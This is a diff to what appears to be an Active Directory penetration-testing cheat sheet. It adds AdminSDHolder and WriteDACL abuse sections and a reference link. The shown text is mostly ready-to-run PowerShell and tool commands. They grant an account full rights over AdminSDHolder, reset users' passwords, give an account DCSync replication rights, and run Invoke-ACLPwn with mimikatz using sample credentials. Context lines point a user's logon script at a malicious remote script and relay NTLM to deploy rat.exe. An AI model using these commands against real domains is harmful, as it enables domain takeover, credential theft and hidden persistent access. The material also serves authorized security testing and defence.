@@ -975,7 +975,7 @@ ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 
 ### Dangerous Built-in Groups Usage
 
-If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object CN=AdminSDHolder,CN=System, " or set "adminCount" attribute to 0 for the required objec
+If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object "CN=AdminSDHolder,CN=System," or set "adminCount" attribute to 0 for the required objec
 
 AdminSDHolder
 
@@ -986,6 +986,17 @@ or
 ([adsisearcher]"(AdminCount=1)").findall()
 ```
 
+#### AdminSDHolder Abuse
+if you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by SDProp
+
+```powershell
+# right to reset password for toto using the account titi
+Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword
+# give all rights
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
+```
+
+
 ### Abusing Active Directory ACLs/ACEs
 
 * **GenericAll on User** : We can reset user's password without knowing the current password
@@ -994,6 +1005,12 @@ or
 * **Self (Self-Membership) on Group** : Another privilege that enables the attacker adding themselves to a group
 * **ForceChangePassword** : we can reset the user's password without knowing their current password: `$c = Get-Credential;Set-DomainUserPassword -Identity changeme -AccountPassword $c.Password -Verbose` 
 * **GenericWrite on User** : WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
+* **WriteDACL** : It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'`
+    ```powershell
+    # give DCSync right to titi
+    Add-ObjectACL -TargetDistinguishedName "dc=dev,dc=testlab,dc=local" -PrincipalSamAccountName titi -Rights DCSync
+    ```
+
 
 ### Trust relationship between domains
 
@@ -1452,3 +1469,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
 * [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https:/www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
 * [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
+* [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
